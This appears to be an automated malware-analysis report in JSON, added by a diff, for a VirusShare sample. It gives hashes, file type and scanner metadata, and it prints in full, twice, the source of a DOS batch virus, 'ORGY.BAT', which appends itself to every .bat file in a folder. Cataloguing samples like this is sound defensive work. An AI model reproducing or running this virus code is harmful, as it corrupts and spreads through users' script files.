@@ -1,0 +1,49 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@echo off\necho orgy > infect1.bat\necho if [%%1]==[infect1.bat] goto DontBother > infect2.bat\necho if [%%1]==[infect2.bat] goto DontBother >> infect2.bat\necho copy %%1 + infect1.bat %%1 >> infect2.bat\necho attrib +r %%1 >> infect2.bat\necho :DontBother >> infect2.bat\nattrib +r infect1.bat\nattrib +r infect2.bat\nfor %%f in (*.bat) do call infect2 %%f\nattrib -r infect1.bat\nattrib -r infect2.bat\ndel infect1.bat\ndel infect2.bat\nrem ORGY.BAT virus by EXE-Gency/[KrashMag]\nrem email exegency@hotmail.com"
+    },
+    "filename": "VirusShare_095289c32fdf97cc58984ea73f3cd908",
+    "filesize": 513,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "095289c32fdf97cc58984ea73f3cd908",
+        "sha1": "1d9335ef3034ae1db89c04c8283ec021abfa3e90",
+        "sha256": "b7a20c344eb7e718bb5c4767d04779c1ce397b09dc287706e1e0bf2230a3c518"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "echo orgy > infect1.bat",
+            "echo if [%%1]==[infect1.bat] goto DontBother > infect2.bat",
+            "echo if [%%1]==[infect2.bat] goto DontBother >> infect2.bat",
+            "echo copy %%1 + infect1.bat %%1 >> infect2.bat",
+            "echo attrib +r %%1 >> infect2.bat",
+            "echo :DontBother >> infect2.bat",
+            "attrib +r infect1.bat",
+            "attrib +r infect2.bat",
+            "for %%f in (*.bat) do call infect2 %%f",
+            "attrib -r infect1.bat",
+            "attrib -r infect2.bat",
+            "del infect1.bat",
+            "del infect2.bat",
+            "rem ORGY.BAT virus by EXE-Gency/[KrashMag]",
+            "rem email exegency@hotmail.com"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.293635",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
